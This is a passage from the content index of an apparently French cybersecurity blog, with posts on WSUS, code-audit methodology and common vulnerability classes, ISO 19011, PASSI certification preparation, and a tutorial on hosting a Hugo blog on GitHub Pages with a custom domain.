depuis les serveurs Microsoft (ce qui peut consommer beaucoup de bande passante lorsqu\u0026rsquo;il est effectué simultanément sur de nombreux systèmes), WSUS télécharge une fois les mises à jour sur un serveur local, puis distribue ces mises à jour aux autres machines du réseau.\nWSUS et la Cybersécurité # En matière de cybersécurité, WSUS joue un rôle crucial. Les mises à jour de Windows incluent souvent des correctifs de sécurité qui visent à réparer les vulnérabilités connues. En utilisant WSUS, les administrateurs peuvent s\u0026rsquo;assurer que ces mises à jour de sécurité sont déployées rapidement et uniformément sur tous les systèmes, minimisant ainsi la fenêtre de vulnérabilité.\nDéploiement uniforme des mises à jour de sécurité : WSUS permet un déploiement rapide et uniforme des mises à jour de sécurité sur tous les systèmes d\u0026rsquo;une organisation.\nRéduction de la fenêtre de vulnérabilité : En permettant un déploiement rapide des correctifs de sécurité, WSUS aide à minimiser la durée pendant laquelle les systèmes restent vulnérables.\nGestion centralisée des mises à jour : Avec WSUS, les administrateurs ont un contrôle centralisé sur les mises à jour de sécurité, leur permettant de s\u0026rsquo;assurer que tous les systèmes sont à jour.\nEconomie de la bande passante : WSUS télécharge une fois les mises à jour sur un serveur local, puis distribue ces mises à jour aux autres machines du réseau, économisant ainsi la bande passante.\nLes serveurs qui n\u0026rsquo;ont pas accès à internet : Les serveurs qui n\u0026rsquo;ont pas besoin d\u0026rsquo;accès à internet n\u0026rsquo;ont pas besoin d\u0026rsquo;y avoir accès pour uniquement les mises à jour étant donné que c\u0026rsquo;est géré par le WSUS qui récupère de façon uniforme les mises à jours.\nConclusion # En somme, WSUS est un outil essentiel pour toute organisation qui utilise des systèmes Windows dans son infrastructure. Il offre non seulement une méthode efficace et centralisée pour gérer les mises à jour de Windows, mais il joue également un rôle crucial dans la protection des systèmes contre les menaces de cybersécurité. En veillant à ce que tous les systèmes soient à jour avec les dernières mises à jour de sécurité, les administrateurs peuvent grandement améliorer la posture de sécurité de leur organisation.\nDocumentation utile # Justification d\u0026rsquo;utilisation WSUS dans le cadre Windows Server : Extrait du Guide d\u0026rsquo;Hygiène Informatique - ANSSI Tutoriel pour mettre en place un WSUS et distribuer les mises à jours : https://openclassrooms.com/fr/courses/2356306-prenez-en-main-windows-server/5836381-distribuez-des-mises-a-jour-avec-wsus\n","date":"3 August 2023","permalink":"/cyber-posts-general/wsus/","section":"Cyber-posts-Generals","summary":"WSUS est un service de Microsoft qui centralise la gestion des mises à jour Windows, améliorant ainsi l\u0026rsquo;efficacité, la bande passante et renforçant la cybersécurité par un déploiement uniforme des correctifs de sécurité.","title":"WSUS : Définition, utilité et importance cyber"},{"content":"","date":"31 July 2023","permalink":"/tags/audit-code/","section":"Tags","summary":"","title":"Audit code"},{"content":" Définition # Un audit de code est un processus d\u0026rsquo;évaluation technique et approfondie du code source d\u0026rsquo;une application logicielle afin de détecter les erreurs de programmation et les vulnérabilités de sécurité. L\u0026rsquo;objectif principal de cet audit est d\u0026rsquo;identifier les failles potentielles qui pourraient être exploitées par des attaquants pour compromettre la sécurité du système ou provoquer un dysfonctionnement de l\u0026rsquo;application. L\u0026rsquo;audit de code est réalisé à l\u0026rsquo;aide d\u0026rsquo;outils d\u0026rsquo;analyse statique et dynamique du code, ainsi que par des examens manuels effectués par des experts en sécurité informatique. Les résultats de l\u0026rsquo;audit de code sont présentés dans un rapport détaillé, fournissant une liste des vulnérabilités détectées et des recommandations pour les corriger, permettant ainsi d\u0026rsquo;améliorer la qualité et la sécurité de l\u0026rsquo;application.\nObjectif de l\u0026rsquo;audit : # L\u0026rsquo;audit de code a pour objectif principal de détecter les vulnérabilités de sécurité et les erreurs de programmation dans le code source d\u0026rsquo;une application. Il vise à identifier les failles potentielles qui pourraient être exploitées par des attaquants pour compromettre la sécurité du système et de proposer un plan d\u0026rsquo;action pour les corriger.\nSuite à quel type d\u0026rsquo;audit on fait ce genre d\u0026rsquo;audit? # L\u0026rsquo;audit de code est généralement réalisé dans le cadre d\u0026rsquo;un audit de sécurité plus large, tel qu\u0026rsquo;un audit de sécurité des applications ou un audit de sécurité des systèmes d\u0026rsquo;information. Il est également réalisé lors de la phase de développement ou avant le déploiement d\u0026rsquo;une application pour s\u0026rsquo;assurer que le code est sûr et conforme aux meilleures pratiques de sécurité. Il est aussi réalisé lors du processus classique : Boite noire -\u0026gt; Boîte grise -\u0026gt; Boîte blanche (ICI)\nMéthodologie étape par étape : # Il n\u0026rsquo;y a pas de méthodologie type, mais globalement, un audit de code se structure sur les axes suivants :\nAnalyse des exigences de sécurité : Comprendre les exigences de sécurité spécifiques de l\u0026rsquo;application à auditer pour orienter l\u0026rsquo;audit. Revue du code source : Analyser le code source ligne par ligne à l\u0026rsquo;aide d\u0026rsquo;outils d\u0026rsquo;analyse statique pour identifier les vulnérabilités potentielles. Identification des vulnérabilités : Rechercher des erreurs courantes telles que les injections SQL, les XSS (Cross-Site Scripting), les CSRF (Cross-Site Request Forgery), les erreurs de gestion des sessions, etc. Analyse de la configuration de sécurité : Examiner la configuration de l\u0026rsquo;application pour s\u0026rsquo;assurer que les paramètres de sécurité sont correctement définis. Test des contrôles de sécurité : Vérifier l\u0026rsquo;efficacité des contrôles de sécurité implémentés dans l\u0026rsquo;application pour se prémunir contre les attaques. Rapport d\u0026rsquo;audit : Présenter les résultats de l\u0026rsquo;audit, y compris les vulnérabilités identifiées et les recommandations pour les corriger. Déroulement de l\u0026rsquo;audit : # L\u0026rsquo;audit de code commence généralement par une analyse statique du code source, qui consiste à utiliser des outils d\u0026rsquo;analyse automatisée pour identifier les erreurs et les vulnérabilités. Ensuite, des tests manuels sont effectués pour vérifier les contrôles de sécurité et détecter les vulnérabilités plus complexes. Enfin, un rapport détaillé est généré, fournissant une liste complète des vulnérabilités détectées et des recommandations pour les corriger.\nAttendus clients de l\u0026rsquo;audit : # Les clients qui font réaliser un audit de code attendent de recevoir un rapport complet et précis sur les vulnérabilités détectées dans leur code source. Ils souhaitent également recevoir des recommandations concrètes pour corriger ces vulnérabilités et améliorer la sécurité globale de l\u0026rsquo;application. Ainsi le rapport idéalement doit comporter à minima les éléments suivants :\nSynthèse globale (overall view) Un plan d\u0026rsquo;action issu des vulnérabilités remontés par l\u0026rsquo;audit Quelques exemples de vulnérabilités courantes identifiées lors d\u0026rsquo;un audit de code : # Quelques exemples de vulnérabilités classiques découvertes lors des audit de code :\nInjection SQL : L\u0026rsquo;absence de validation ou d\u0026rsquo;échappement des entrées utilisateur peut permettre aux attaquants d\u0026rsquo;injecter des requêtes SQL malveillantes, compromettant ainsi la base de données et pouvant entraîner la divulgation d\u0026rsquo;informations sensibles (exemple : \u0026ldquo;SELECT * FROM users WHERE username=\u0026rsquo;$username\u0026rsquo;;\u0026rdquo;).\nCross-Site Scripting (XSS) : Des données non vérifiées insérées dans des pages Web peuvent permettre aux attaquants d\u0026rsquo;injecter du code malveillant dans les navigateurs des utilisateurs, ce qui peut entraîner des vols de session ou des redirections vers des sites frauduleux (exemple : \u0026lt;script\u0026gt;code malveillant ici\u0026lt;/\u0026gt;\u0026quot;).\nCross-Site Request Forgery (CSRF) : Les attaquants peuvent inciter les utilisateurs authentifiés à envoyer des requêtes non intentionnelles à un site Web, par exemple, en cliquant sur un lien malveillant dans un e-mail, ce qui peut entraîner des actions indésirables sur le compte de l\u0026rsquo;utilisateur (exemple : envoyer un formulaire avec une action malveillante sans que l\u0026rsquo;utilisateur en soit conscient).\nMauvaise gestion des erreurs : Les messages d\u0026rsquo;erreur non gérés peuvent divulguer des informations sensibles sur l\u0026rsquo;application ou son environnement, ce qui pourrait être exploité par des attaquants pour mieux cibler leurs attaques (exemple : affichage du message d\u0026rsquo;erreur complet avec la trace du serveur).\nMauvaise validation des entrées utilisateur : Le manque de validation appropriée des entrées utilisateur peut entraîner des vulnérabilités telles que l\u0026rsquo;injection SQL ou les XSS, en permettant aux attaquants d\u0026rsquo;insérer des données malveillantes dans l\u0026rsquo;application (exemple : l\u0026rsquo;application accepte des valeurs non attendues dans les formulaires).\nUtilisation de fonctions non sécurisées : L\u0026rsquo;utilisation de fonctions non sécurisées ou obsolètes peut rendre l\u0026rsquo;application vulnérable à des attaques, par exemple, l\u0026rsquo;utilisation de fonctions de hachage faibles (exemple : MD5) qui peuvent être facilement déchiffrées.\nDépassement de tampon (Buffer Overflow) : Une mauvaise gestion des tampons peut permettre aux attaquants d\u0026rsquo;écrire des données malveillantes dans des zones mémoires adjacentes, entraînant des exécutions de code arbitraire (exemple : une variable tampon est débordée avec des données malveillantes =\u0026gt; AAAAAAAAAAAAAAAAAAAA pour faire de l\u0026rsquo;écrasement de mémoire).\nMauvaise gestion des droits : Une application qui accorde des privilèges excessifs à des utilisateurs non autorisés peut permettre aux attaquants d\u0026rsquo;accéder à des fonctionnalités ou à des données sensibles (exemple : un utilisateur non administrateur peut accéder à des pages d\u0026rsquo;administration).\nUtilisation de mots de passe en clair : Stocker les mots de passe des utilisateurs sans cryptage expose les informations sensibles en cas de violation de la base de données (exemple : stocker les mots de passe en texte brut au lieu de les hacher).\nExposition d\u0026rsquo;informations sensibles : L\u0026rsquo;exposition non autorisée de données sensibles, tels que les numéros de sécurité sociale, les informations financières, etc., peut entraîner une violation de la confidentialité et des atteintes à la vie privée (exemple : rendre accessible des informations sensibles via des API non sécurisées).\nUtilisation de composants obsolètes ou vulnérables : L\u0026rsquo;incorporation de composants logiciels obsolètes ou ayant des vulnérabilités connues peut ouvrir des portes aux attaquants qui exploitent ces faiblesses pour compromettre l\u0026rsquo;application (exemple : utilisation d\u0026rsquo;une version non corrigée d\u0026rsquo;une bibliothèque tiers).\nMauvaise gestion des sessions : Une mauvaise gestion des sessions peut conduire à des vulnérabilités de vol de session, d\u0026rsquo;usurpation d\u0026rsquo;identité et d\u0026rsquo;accès non autorisé (exemple : sessions sans expiration ou non invalidées après la déconnexion).\nInclusion de fichiers non sécurisée (Local File Inclusion) : L\u0026rsquo;inclusion de fichiers distants ou non vérifiés peut permettre aux attaquants d\u0026rsquo;accéder à des fichiers sensibles sur le serveur ou d\u0026rsquo;exécuter du code malveillant (exemple : inclusion de fichiers basée sur des entrées utilisateur non filtrées).\nUtilisation de protocoles de communication non sécurisés : L\u0026rsquo;utilisation de protocoles non sécurisés, tels que HTTP non chiffré, expose les données de l\u0026rsquo;application à des interceptions et à des attaques d\u0026rsquo;écoute passive (exemple : transmission de mots de passe en clair).\nAbsence de contrôles d\u0026rsquo;accès : L\u0026rsquo;absence de contrôles d\u0026rsquo;accès appropriés peut permettre aux utilisateurs non autorisés d\u0026rsquo;accéder à des fonctionnalités sensibles ou restreintes (exemple : un utilisateur non authentifié peut accéder à des pages d\u0026rsquo;administration).\nExposition de points d\u0026rsquo;API non sécurisés : Des API mal configurées peuvent permettre aux attaquants d\u0026rsquo;accéder à des données ou des fonctionnalités sensibles sans authentification appropriée (exemple : des API sans clés d\u0026rsquo;API ou avec des autorisations trop permissives).\nErreurs de configuration de sécurité : La mauvaise configuration des paramètres de sécurité, tels que les fichiers de configuration ou les autorisations de fichiers, peut exposer l\u0026rsquo;application à des risques inutiles (exemple : accès public à des fichiers de configuration contenant des informations sensibles).\nUtilisation de bibliothèques et de frameworks non sécurisés : L\u0026rsquo;utilisation de versions obsolètes ou vulnérables de bibliothèques et de frameworks peut exposer l\u0026rsquo;application à des failles de sécurité connues (exemple : utilisation d\u0026rsquo;une version de bibliothèque qui contient une vulnérabilité corrigée dans les versions ultérieures).\nUtilisation excessive de commentaires sensibles dans le code source : L\u0026rsquo;inclusion de commentaires sensibles dans le code peut exposer des informations confidentielles sur le fonctionnement interne de l\u0026rsquo;application (exemple : inclusion de mots de passe ou de clés API dans les commentaires).\nAbsence de mécanismes de protection contre les attaques par force brute : L\u0026rsquo;absence de mécanismes de protection, tels que des délais de verrouillage des comptes ou des CAPTCHA, peut faciliter les attaques par force brute contre les comptes d\u0026rsquo;utilisateurs (exemple : pas de limitation du nombre de tentatives de connexion).\nDocumentation utile à garder sous la main # Extrait référentiel PASSI ","date":"31 July 2023","permalink":"/cyber-posts-audits/audit-code/","section":"Cyber-posts-Audits","summary":"Cet article technique dévoile les objectifs, la méthodologie étape par étape, et les vulnérabilités courantes identifiées lors d\u0026rsquo;un audit de code.","title":"Audit de Code : La quête des vulnérabilités cachées dans vos applications."},{"content":"","date":"31 July 2023","permalink":"/cyber-posts-audits/","section":"Cyber-posts-Audits","summary":"","title":"Cyber-posts-Audits"},{"content":"","date":"31 July 2023","permalink":"/tags/passi/","section":"Tags","summary":"","title":"PASSI"},{"content":"","date":"31 July 2023","permalink":"/categories/passi/","section":"Categories","summary":"","title":"PASSI"},{"content":"","date":"31 July 2023","permalink":"/tags/preparation/","section":"Tags","summary":"","title":"Preparation"},{"content":" Introduction à l\u0026rsquo;ISO 19011 : Lignes directrices pour l\u0026rsquo;audit de systèmes de management # L\u0026rsquo;ISO 19011 est une norme internationale développée par l\u0026rsquo;Organisation internationale de normalisation (ISO). Publiée pour la première fois en 2002, cette norme a été révisée en 2011 pour refléter les dernières pratiques et évolutions en matière d\u0026rsquo;audit de systèmes de management. L\u0026rsquo;ISO 19011 fournit des lignes directrices essentielles pour les auditeurs, leur permettant de mener des évaluations systématiques, impartiales et efficaces des systèmes de management, y compris ceux liés à la qualité, à l\u0026rsquo;environnement, à la santé et à la sécurité au travail, à la sécurité des systèmes d\u0026rsquo;information, et bien d\u0026rsquo;autres domaines.\nLes objectifs de l\u0026rsquo;ISO 19011 : # L\u0026rsquo;ISO 19011 vise à établir des principes et des lignes directrices pour les audits de systèmes de management afin de :\nAssurer une approche cohérente et harmonisée des audits, quel que soit le domaine spécifique du système de management. Favoriser l\u0026rsquo;amélioration continue des systèmes de management grâce à des évaluations régulières et pertinentes. Renforcer la confiance des parties prenantes (clients, actionnaires, organismes de réglementation, etc.) dans l\u0026rsquo;efficacité et la performance des systèmes de management. Fournir des orientations pour les auditeurs, tant internes qu\u0026rsquo;externes, en matière de compétences, de comportement et d\u0026rsquo;éthique professionnelle. Les grands axes de l\u0026rsquo;ISO 19011 : # L\u0026rsquo;ISO 19011 met l\u0026rsquo;accent sur cinq grands axes pour la réalisation d\u0026rsquo;audits de systèmes de management de qualité :\nPrincipes d\u0026rsquo;audit # Cette partie énonce les principes fondamentaux qui guident les auditeurs tout au long du processus d\u0026rsquo;audit. Ces principes incluent l\u0026rsquo;intégrité, l\u0026rsquo;éthique, l\u0026rsquo;indépendance, l\u0026rsquo;approche basée sur les preuves, la gestion des risques et la confidentialité. Ils garantissent que l\u0026rsquo;audit est mené de manière juste, impartiale et systématique, en utilisant des éléments factuels pour évaluer la conformité et l\u0026rsquo;efficacité du système de management.\nGestion d\u0026rsquo;un programme d\u0026rsquo;audit # Cette section aborde les aspects pratiques de la planification, de la mise en œuvre et de l\u0026rsquo;amélioration d\u0026rsquo;un programme d\u0026rsquo;audit. Elle explique comment établir un plan d\u0026rsquo;audit, définir les objectifs et les critères d\u0026rsquo;audit, sélectionner les auditeurs qualifiés, gérer les ressources, et suivre les résultats des audits pour assurer leur efficacité.\nRéalisation d\u0026rsquo;audits # Cette partie couvre les étapes clés de la réalisation d\u0026rsquo;un audit, depuis la préparation initiale jusqu\u0026rsquo;à la communication des résultats. Elle explique comment effectuer des entrevues avec le personnel, collecter et analyser des preuves, évaluer la conformité, et identifier les opportunités d\u0026rsquo;amélioration. Elle met également l\u0026rsquo;accent sur la communication ouverte et constructive avec l\u0026rsquo;organisation auditée pour faciliter la compréhension et l\u0026rsquo;acceptation des résultats d\u0026rsquo;audit.\nCompétences et évaluation des auditeurs # Cette section détaille les compétences nécessaires pour être un auditeur qualifié et compétent. Elle fournit des orientations pour évaluer les compétences des auditeurs, développer leurs connaissances techniques et comportementales, et veiller à ce qu\u0026rsquo;ils maintiennent leur niveau de compétence tout au long de leur carrière.\nEvaluation des personnes réalisant des audits de systèmes de management # Cette partie s\u0026rsquo;applique aux organismes de certification et aux organismes d\u0026rsquo;accréditation impliqués dans l\u0026rsquo;évaluation des personnes réalisant des audits de systèmes de management. Elle définit les exigences en matière de qualification, d\u0026rsquo;expérience et de compétences pour les auditeurs, garantissant ainsi l\u0026rsquo;intégrité et la crédibilité du processus de certification.\n","date":"30 July 2023","permalink":"/cyber-posts-audits/iso-19011/","section":"Cyber-posts-Audits","summary":"Cet article propose une analyse approfondie de l\u0026rsquo;ISO 19011, la norme incontournable fournissant des directives essentielles pour réaliser des audits efficaces et rigoureux, favorisant ainsi la performance et la conformité des systèmes de management.","title":"Décryptage de l'ISO 19011 : Lignes directrices essentielles pour des audits de qualité."},{"content":"","date":"30 July 2023","permalink":"/tags/iso-19011/","section":"Tags","summary":"","title":"ISO 19011"},{"content":"","date":"29 July 2023","permalink":"/categories/dev/","section":"Categories","summary":"","title":"Dev"},{"content":"","date":"29 July 2023","permalink":"/tags/development/","section":"Tags","summary":"","title":"Development"},{"content":" Introduction # Créer du contenu technique est une compétence qui s\u0026rsquo;améliore avec la pratique, et une manière facile de partager ses connaissances technologiques est de créer un blog et de le partager sur Internet. Une idée fausse courante est que créer son propre site web ou blog nécessite des compétences techniques (comme de l\u0026rsquo;expérience avec les bases de données, les serveurs web, un système de gestion de contenu comme WordPress, ou des machines virtuelles) et un investissement financier (location d\u0026rsquo;une machine virtuelle auprès d\u0026rsquo;un fournisseur de cloud public ou hébergement sur son propre homelab).\nIdéalement, nous avons trois objectifs lors de la création et de la maintenance d\u0026rsquo;un blog :\nCoût nul ou faible - Gratuit ou aussi proche que possible de la gratuité. Productivité - Facile à rédiger et à maintenir. Cloud Native - Utilisation de services cloud publics pour l\u0026rsquo;hébergement, permettant une mise à l\u0026rsquo;échelle infinie. Pour le faire, j\u0026rsquo;ai décidé de choisir les éléments suivants :\nMarkdown - Un langage de balisage extrêmement facile à lire nativement, facile à écrire et pouvant être facilement converti en HTML. Souvent maîtrisé par les personnes ayant pour objectif de créer du contenu technique. Hugo - Un générateur de sites statiques écrit en langage Go qui permet de rendre le contenu écrit en Markdown en pages HTML. GitHub Pages - Un service de GitHub qui héberge du contenu web (tel que des pages HTML) stocké dans un référentiel GitHub. Gratuit, rien de mieux pour optimiser les coûts de son blog Godaddy - Service provider qui m\u0026rsquo;a permis d\u0026rsquo;acheter mon DNS à 1€ pour la 1ère année. Dans cet article, nous allons montrer comment créer gratuitement ton propre blog en utilisant les technologies mentionnées ci-dessus. Nous construirons notre blog en utilisant un hôte Archlinux (bien que la plupart des instructions soient réalisables sur n\u0026rsquo;importe quel système d\u0026rsquo;exploitation Linux, y compris Windows Subsystem for Linux [WSL]).\nInstallation des dépendances # Il faut principalement que la CLI Hugo pour le faire sur linux :\nsudo snap install hugo --channel=extended Pour les autres systèmes d\u0026rsquo;exploitation, il est recommandé de revenir vers la documentation Hugo.\npour vérifier que Hugo est bien installé, il suffit de lancer la commande :\nhugo help Il faudra aussi par la suite git, donc il faut s\u0026rsquo;assurer d\u0026rsquo;en avoir un.\nCréation du site Hugo # Création initiale # Une fois hugo installé, on peut créer un nouveau blog avec Hugo grace à la commande :\nhugo new site \u0026lt;insérer votre nom de blog\u0026gt; Pour tester que tout marche vous pouvez vous aider des commandes hugo qui permet de vérifier la configuration actuelle et hugo server pour lancer un serveur en hot reload pour afficher le contenu du blog.\nAjout du thème # Il faudra installer un thème Hugo pour personaliser votre blog. Heureusement pour vous, Hugo fournit un catalogue complet de différents thèmes déjà bien documentées et bien utilisées.\nUne fois votre choix fait, il suffit d\u0026rsquo;installer le thème. Dans le cadre de ce tutoriel, j\u0026rsquo;utiliserai blowfish qui me parait pluôt très complet et permet de réaliser différentes configuration. (Attention, petit downside, dès qu\u0026rsquo;un outil est complet, il faut le configurer pour qu\u0026rsquo;il corresponde à tout ce qu\u0026rsquo;il permet de réaliser)\ngit submodule add https://github.com/nunocoracao/blowfish.git themes/blowfish Une fois installé, il faudra faire différentes manipulations déjà bien détaillées dans le guide officiel de blowfish, mais je présenterai quand même les principales.\nD\u0026rsquo;abord, il est idéal de créer un dossier à la racine config/_default qui est pris par défaut par Hugo au lancement de l\u0026rsquo;application ou au build. Puis mettez dessus tous les fichiers de configuration .toml utilisées par le thème, pour le faire :\ncp themes/blowfish/**/*.toml config/_default vous aurez alors une liste de fichiers, le config.toml à renomer en hugo.toml comme il s\u0026rsquo;agit du nouveau nom du fichier de configuration de Hugo depuis la maj 0.87.\nIl faut aussi modifier sur ce fichier les éléments suivants :\ntheme = \u0026#34;blowfish\u0026#34; baseURL = \u0026#34;\u0026lt;votre_pseudo_github\u0026gt;.github.io\u0026#34; defaultContentLanguage = \u0026#34;en\u0026#34; defaultAppearance= \u0026#34;dark\u0026#34; Les fichiers sont assez bien documentés globalement, et si vous voulez plus d\u0026rsquo;inspiration pour des modèles plus poussés pour en tirer un maximum, Blowfish fournit un repo des exemples avec des liens vers les github et les configurations particulières.\nexemples fournis par Blowfish Créer votre premier article # Pour ça, c\u0026rsquo;est très simple, il suffit d\u0026rsquo;utiliser la CLI Hugo encore une fois :\nhugo new posts/first-post.md Et puis VOILÀ, vous pouvez déjà poster votre premier post.\nDéployer le site # Maintenant que vous êtes content de votre blog, ce serait bien de pouvoir le partager avec tout le monde. Pour ce faire, on va utiliser les github pages.\nAvant de faire une quelconque manipulation, c\u0026rsquo;est important de créer un fichier .gitignore à la racine de votre projet avec comme contenu par exemple :\npublic/ Pour ne pas versionner vos builds.\nIl suffit de créer un repository sur Github, idéalement pour ne pas avoir à faire du routage de nommer le repo de la forme suivante \u0026lt;username_github\u0026gt;.github.io. Autrement, Github va par défaut servir votre site plutôt sur le \u0026lt;username_github\u0026gt;.github.io/\u0026lt;nom_du_repo\u0026gt;.\nPar la suite, github vous fournit les étapes pour push votre dossier déjà existant, sinon vous pouvez utiliser la suite pour le faire directement à l\u0026rsquo;entiereté du repo :\ngit init git add -A git commit -m \u0026#34;Initial commit\u0026#34; git branch -M main git remote add origin \u0026lt;origine_donnée_par_github\u0026gt; git push -u origin main Une fois push, plus qu\u0026rsquo;à lancer le déploiement.\nPour cela, on va utiliser les Github Actions workflows.\nPour cela, commencez par créer un fichier de configuration :\ntouch .github/workflows/deploy_gh.yml Dans lequel on va ajouter le contenu suivant :\n--- name: Deploy Hugo site via GitHub Pages on: push: branches: - main permissions: contents: write jobs: deploy: runs-on: ubuntu-22.04 steps: - uses: actions/checkout@v2 with: submodules: true fetch-depth: 0 - name: Setup Hugo uses: peaceiris/actions-hugo@v2 with: hugo-version: \u0026#34;latest\u0026#34; extended: true - name: Build run: hugo --minify - name: Deploy uses: peaceiris/actions-gh-pages@v3 if: github.ref == \u0026#39;refs/heads/main\u0026#39; with: github_token: ${{ secrets.GITHUB_TOKEN }} publish_dir: ./public Une fois de nouveau push toutes les modifications sur le repo, vous pouvez aller vérifier que tout est réalisé comme vous le souhaitiez.\nUne fois sur la partie pages, vous allez pouvoir modifier la source des github pages : Une fois selectionné la bonne source comme indiqué sur le screen suivant :\nÀ partir de là, vous pouvez accéder directement à votre site depuis l\u0026rsquo;url \u0026lt;identifiant_github.github.io\u0026gt;\nUtiliser son propre DNS # Comme expliqué au début, j\u0026rsquo;ai opté pour GoDaddy pour acheter mon DNS. Du coup le tuto sera plutôt axé sur comment utiliser GoDaddy pour le blog.\nAjouter son DNS sur son profile Github : # La première étape est d\u0026rsquo;ajouter votre DNS à votre profile Github, l\u0026rsquo;objectif est de valider que vous en êtes bien le détenteur.\nPour le faire, il faut se rendre aux paramètres github, puis sur la partie Pages\nUne fois sur la bonne page, cliquer sur le \u0026ldquo;Add a verified domain\u0026rdquo; et puis suivre les étapes : Et de l\u0026rsquo;autre côté, il faut se rendre à sa console GoDaddy, et partir à la partie gestion du domaine puis y ajouter un record TXT avec les éléments fournis par Github comme dans l\u0026rsquo;image : Une fois fait, il suffit de valider sur Github et le domaine est maintenant validé.\nMaintenant que vous avez fait ça, il faut aussi ajouter 5 entrées DNS sur votre GoDaddy avec les éléments suivants :\nType Name Data TTL A @ 185.199.108.153 600seconds A @ 185.199.109.153 600seconds A @ 185.199.110.153 600seconds A @ 185.199.111.153 600seconds CNAME www \u0026lt;usernamegithub\u0026gt;.github.io 1 Hour Il faudrait aussi ajouter à la racine de votre projet un fichier CNAME qui contient principalement votre nom de domaine\n\u0026lt;nom_de_domaine\u0026gt; Il reste plus qu\u0026rsquo;à commit le code et puis push.\nNormalement là votre blog sera accessible depuis votre nom de domaine au bout de quelques minutes.\nEt puis à la toute fin, il suffit d\u0026rsquo;activer le HTTPS (ça peut prendre jusqu\u0026rsquo;à 1h, le temps d\u0026rsquo;émettre un certificat pour le HTTPS et puis de tout configurer côté Github)\nEt vous voilà, tout est configuré, il suffit d\u0026rsquo;écrire vos articles et de push et au bout de quelques minutes, tout sera sur le site automatiquement.\n","date":"29 July 2023","permalink":"/dev-posts/blog/","section":"Dev-posts","summary":"J\u0026rsquo;ai rédigé cet article afin de partager comment se blog a été réalisé. Il a coûté uniquement le prix du DNS à l\u0026rsquo;année et est rédigé entièrement en Markdown, aucune connaissance autre n\u0026rsquo;est nécessaire.","title":"Faire son blog en 10 minutes"},{"content":"","date":"29 July 2023","permalink":"/tags/knowledge/","section":"Tags","summary":"","title":"Knowledge"},{"content":" Introduction # Tout d\u0026rsquo;abord, PASSI, dans le cadre de l\u0026rsquo;ANSSI, fait référence à une méthode d\u0026rsquo;évaluation de la sécurité des systèmes d\u0026rsquo;information. Le terme \u0026ldquo;PASSI\u0026rdquo; signifie \u0026ldquo;Prestation d\u0026rsquo;Assistance en matière de Sécurité des Systèmes d\u0026rsquo;Information\u0026rdquo;. Il s\u0026rsquo;agit d\u0026rsquo;une prestation proposée par l\u0026rsquo;ANSSI qui permet aux organisations publiques ou privées d\u0026rsquo;évaluer la sécurité de leurs systèmes d\u0026rsquo;information en faisant appel à des experts certifiés par l\u0026rsquo;ANSSI.\nJe vais passer les 5 portées certifiantes par l\u0026rsquo;ANSSI, et pour cela, je rédige une série d\u0026rsquo;articles qui ont pour objectif ce synthétiser les différents points découverts tout le long.\nISO 19011 # L\u0026rsquo;ISO 19011 est une norme internationale qui fournit des lignes directrices pour l\u0026rsquo;audit de systèmes de management, y compris les audits liés à la sécurité des systèmes d\u0026rsquo;information. Cette norme joue un rôle crucial dans le contexte du PASSI, car elle définit les principes et les processus fondamentaux de l\u0026rsquo;audit, ainsi que les compétences requises pour mener à bien ces évaluations. Pour réussir le PASSI, les auditeurs doivent être familiers avec les directives de l\u0026rsquo;ISO 19011 et être en mesure de les appliquer de manière cohérente tout au long du processus d\u0026rsquo;audit. Cette norme met l\u0026rsquo;accent sur des éléments tels que la planification de l\u0026rsquo;audit, la collecte de preuves, l\u0026rsquo;analyse des résultats, la communication des conclusions, et la surveillance des actions correctives. Se conformer à l\u0026rsquo;ISO 19011 garantit que l\u0026rsquo;audit est mené de manière méthodique, impartiale et efficace, ce qui contribue à l\u0026rsquo;obtention de résultats fiables et pertinents.\nAudit Organisationnel # L\u0026rsquo;audit organisationnel est la première étape cruciale dans la préparation au PASSI. Elle exige une compréhension approfondie des processus et des politiques de sécurité de l\u0026rsquo;organisation. Vous devrez vous familiariser avec les normes de sécurité en vigueur, telles que ISO 27001, et comprendre leur mise en œuvre dans l\u0026rsquo;entreprise. Il est important de se concentrer sur l\u0026rsquo;identification et l\u0026rsquo;évaluation des risques liés à la sécurité des systèmes d\u0026rsquo;information. Vous devrez également analyser la gouvernance de la sécurité, les rôles et les responsabilités des différents acteurs impliqués dans la sécurité de l\u0026rsquo;organisation. La documentation et la communication des résultats sont des compétences essentielles pour cette portée.\nAudit de Configuration # L\u0026rsquo;audit de configuration implique l\u0026rsquo;évaluation des configurations techniques des systèmes, des applications et des périphériques utilisés dans l\u0026rsquo;organisation. Pour cette étape, il est essentiel d\u0026rsquo;acquérir une connaissance approfondie des meilleures pratiques de sécurité pour la configuration des systèmes d\u0026rsquo;exploitation, des bases de données, des pare-feu, des routeurs, etc. Vous devrez identifier les paramètres de sécurité mal configurés, les vulnérabilités potentielles et les éventuelles erreurs de configuration. Une expertise en outils d\u0026rsquo;audit de sécurité, tels que Nessus ou OpenVAS, peut s\u0026rsquo;avérer précieuse pour automatiser certaines tâches de découverte et d\u0026rsquo;analyse des vulnérabilités.\nAudit d\u0026rsquo;Architecture # Dans cette étape, vous examinerez en détail l\u0026rsquo;architecture globale du système d\u0026rsquo;information de l\u0026rsquo;organisation. Cela implique de comprendre la conception des réseaux, des serveurs, des applications et des services, ainsi que les interactions entre eux. Une solide connaissance des principes de conception sécurisée est nécessaire pour identifier les éventuelles failles de sécurité et les points de vulnérabilité dans l\u0026rsquo;architecture. Vous devrez également être capable d\u0026rsquo;évaluer la résilience du système face aux attaques potentielles et de proposer des mesures d\u0026rsquo;amélioration pour renforcer la sécurité de l\u0026rsquo;infrastructure.\nAudit de Code # L\u0026rsquo;audit de code est une étape fondamentale pour évaluer la sécurité des applications développées en interne ou utilisées par l\u0026rsquo;organisation. Vous devrez vous familiariser avec les principaux langages de programmation utilisés dans l\u0026rsquo;entreprise et comprendre les meilleures pratiques de sécurité liées au développement logiciel, telles que l\u0026rsquo;évitement des injections SQL, la gestion des sessions sécurisées, la validation des entrées, etc. L\u0026rsquo;utilisation d\u0026rsquo;outils d\u0026rsquo;analyse statique et dynamique du code, comme SonarQube ou OWASP ZAP, est essentielle pour identifier les vulnérabilités et les erreurs de programmation susceptibles d\u0026rsquo;être exploitées par des attaquants.\nAudit Test d\u0026rsquo;Intrusion # L\u0026rsquo;audit test d\u0026rsquo;intrusion, souvent appelé \u0026ldquo;pentest\u0026rdquo;, est l\u0026rsquo;étape finale et la plus pratique du PASSI. Elle consiste à simuler une attaque réelle sur les systèmes de l\u0026rsquo;organisation pour évaluer leur résistance face à une intrusion potentielle. Pour cette portée, vous devrez vous former aux méthodes 